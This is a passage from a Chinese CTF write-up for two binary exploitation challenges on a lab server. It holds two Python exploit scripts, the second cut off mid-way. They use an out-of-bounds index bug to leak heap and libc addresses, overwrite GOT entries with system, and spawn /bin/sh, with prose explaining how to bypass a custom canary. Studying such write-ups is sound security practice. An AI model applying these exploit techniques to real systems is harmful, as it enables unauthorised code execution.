           io.read_until("Query index: ")
           io.writeline(str(index))
    def sub_update(io, index, number):
           io.read_until("Choose: ")
           io.writeline("2")
           io.read_until("Update index: ")
           io.writeline(str(index))
           io.read_until("Update number: ")
           io.writeline(str(number))
    def sub_sort(io):
           io.read_until("Choose: ")
           io.writeline("3")
    def sub_quit(io):
           io.read_until("Choose: ")
           io.writeline("7")
    def pwn(io):
           #prepare
           seq = ["1"] * 15
           sort(io, seq)
           sub_sort(io)
           sub_quit(io)
           seq = ["2"]
           sort(io, seq)
           sub_sort(io)
           sub_quit(io)
           #io.gdb_hint()
           clear(io)
           seq = ["2"]
           sort(io, seq)
           sub_sort(io)
           sub_quit(io)
           seq = ["2"]
           sort(io, seq)
           sub_sort(io)
           sub_quit(io)
           seq = ["1"] * 13
           sort(io, seq)
           sub_sort(io)
           #system_addr = struct.unpack("i", struct.pack("I", system_addr))
           sub_update(io, 5, 0x7ffffff0)
           sub_update(io, 6, 0)
           sub_update(io, 9, -1)
           sub_update(io, 10, 0)
           sub_update(io, 13, 100)
           sub_quit(io)
           history(io)
           io.read_until("ID = 1")
           io.read_until("Data = 2 ")
           data = int(io.read_until(" ")[:-1])
           heap_addr = struct.unpack("I", struct.pack("i", data))[0]
           print "heap_addr:", hex(heap_addr)
           data_buff = heap_addr - 0x08
           print "data_buff:", hex(data_buff)
           clear(io)
           #io.interact()
           seq = ["1"]
           sort(io, seq)
           sub_sort(io)
           sub_quit(io)
           seq = ["1"]
           sort(io, seq)
           sub_sort(io)
           sub_quit(io)
           #2
           seq = ["1"]
           sort(io, seq)
           sub_sort(io)
           puts_got = 0x0804d030
           sub_update(io, 1, puts_got)
           sub_quit(io)
           history(io)
           io.read_until("ID = 2")
           io.read_until("Len = ")
           data = int(io.read_until(", Data")[:-6])
           real_addr = struct.unpack("I", struct.pack("i", data))[0]
           print "real_addr:", hex(real_addr)
           #elf_info = ELF("./libc.so.6")
           elf_info = ELF("./libc.so")
           print hex(elf_info.symbols["puts"])
           libc_addr = real_addr - elf_info.symbols["puts"]
           system_addr = libc_addr + elf_info.symbols["system"]
           print "system addr:", hex(system_addr)
           #
           seq = ["4"] * 1
           sort(io, seq)
           sub_sort(io)
           zero_area = data_buff + (2 + 5 + 5) * 4
           sub_update(io, 1, zero_area)
           sub_quit(io)
           history(io)
           #io.gdb_hint()
           #
           t_reload(io, 1)
           sub_query(io, 100)
           begin_addr = data_buff + 0x20 + 1 * 4
           atoi_got = 0x804d020
           print "atoi_got:", hex(atoi_got)
           global_addr = (data_buff & 0xffffff00) + 0x10100
           print "global_addr:", hex(global_addr)
           diff = global_addr - begin_addr
           print diff
           diff_index = (0x100e8 - (0x058 + 4)) / 4
           sub_update(io, diff_index, 0x1000)
           sub_update(io, diff_index + 1, 0x0)
           sub_update(io, diff_index + 2, atoi_got - 0x10)
           sub_update(io, diff_index + 3, 0)
           io.gdb_hint()
           sub_quit(io)
           seq = ['q']
           sort2(io, seq, 4)
           #if diff < 0:
           #     sub_quit(io)
           #     t_exit(io)
           #     return False
           system_addr = struct.unpack("i", struct.pack("I", system_addr))[0]
           sub_update(io, 3, system_addr)
           sub_quit(io)
           io.read_until("Choose: ")
           io.writeline("/bin/sh")
           io.interact()
           return True
    io = get_io(target)
    pwn(io)
成功截图：
**600 Pwn-2**
这个题目与pwn400属于同一系列，大部分代码相同，可以看成pwn2增加了一些机制，在history_info_struct结构体部分，增加了一个canary，如下:
00000000 history_info_struct struc ; (sizeof=0xC)
00000000 count dd ?
00000004 canary dd ?
00000008 number_buff dd ? ; offset
0000000C history_info_struct ends
其中canary的计算至于一个随机数和count有关系，而且count的计数也只与你实际输入的个数相关，而不是pwn1中最开始的那个数量，如下：
在查询和修改之前都会检查canary：
查询：
修改：
然而，index漏洞依然存在，但是不能只通过修改count和info就能利用的，因为count和canary及随机数相关，必须联动修改。
问题1，泄露随机数：由于查询可以越界1个index，在打印历史记录时，如果count值小于等于0，那么他可以打印基本信息，如id号和count值，但是不打印后续信息，所以可以更改后一个history_manager_struct的值为随机数全局变量的地址，通过长度泄露得知。
问题2，构造利用，其实基本和pwn1差不多，也需要构造两个假节点，一个节点的count值为-2，另一个的值为特别大的数，但是在reload之前，由于不修改dest中的内容，所以count和canary提取能够预知的只有一个，因为提取布置内存的时候，随机数还没有泄露，而泄露了以后，clear函数就不能在执行，所以在这里先不设置count，因为canary
=
count^随机数，所以我可以将canary先设置非常小，然后再知道随机数后，就可以得到相应的count值，由于是随机数，每位都随机，所以canary较小时，count一般较大，最后计算出count后，直接通过越界去布置这个内容即可。
问题3，got表不合适，pwn1中可以先不设置元素内容，但是数量依然有保障，但是pwn2是根据你实际输入的个数来确定你的count，所以每次会大量修改got表中的值，这样先修改后跨函数利用的话，基本都会崩溃。在这里采用reload的方式，将已知的值存在另一块内存中，然后直接copy过来。
问题4，还需要注意的是堆内存需要进行转移，由于设置的东西较多，设置的时候需要申请的值也比较多，但是后面一部分堆没有map进来，所以需要进行转移。
详细方法见脚本：
    __author__ = "pxx"
    from zio import *
    from pwn import *
    import struct
    #target = "./pwn2"
    target = ("pwn.lab.seclover.com", 22222)
    def get_io(target):
           r_m = COLORED(RAW, "green")
           w_m = COLORED(RAW, "blue")
           io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)
           return io
    def history(io):
           io.read_until("_CMD_$ ")
           io.writeline("history")
    def t_reload(io, t_id):
           io.read_until("_CMD_$ ")
           io.writeline("reload")
           io.read_until("Reload history ID: ")
           io.writeline(str(t_id))
    def clear(io):
           io.read_until("_CMD_$ ")
           io.writeline("clear")
    def sort(io, seq):
           io.read_until("_CMD_$ ")
           io.writeline("sort")
           io.read_until("How many numbers do you want to sort: ")
           io.writeline(str(len(seq)))
           for item in seq:
                  io.read_until("Enter a number: ")
                  io.writeline(item)
    def sort2(io, seq, count):
           io.read_until("_CMD_$ ")
           io.writeline("sort")
           io.read_until("How many numbers do you want to sort: ")
           io.writeline(str(count))
           for item in seq:
                  io.read_until("Enter a number: ")
                  io.writeline(item)
    def t_exit(io):
           io.read_until("_CMD_$ ")
           io.writeline("exit")
    def sub_query(io, index):
           io.read_until("Choose: ")
           io.writeline("1")
           io.read_until("Query index: ")
           io.writeline(str(index))
    def sub_update(io, index, number):
           io.read_until("Choose: ")
           io.writeline("2")
           io.read_until("Update index: ")
           io.writeline(str(index))
           io.read_until("Update number: ")
           io.writeline(str(number))
    def sub_sort(io):
           io.read_until("Choose: ")
           io.writeline("3")
    def sub_quit(io):
           io.read_until("Choose: ")
           io.writeline("7")
    def pwn(io):
           seq = ["8"] * 16
           sort(io, seq)
           sub_sort(io)
           #sub_update(io, 9, 0x7ffffff0)
           sub_query(io, 16)
           io.read_until("[*L*] Query result: ")
           data = io.read_until("n")[:-1]
           heap_addr = int(data)
           data_buff = heap_addr
           print "data_buff:", hex(data_buff)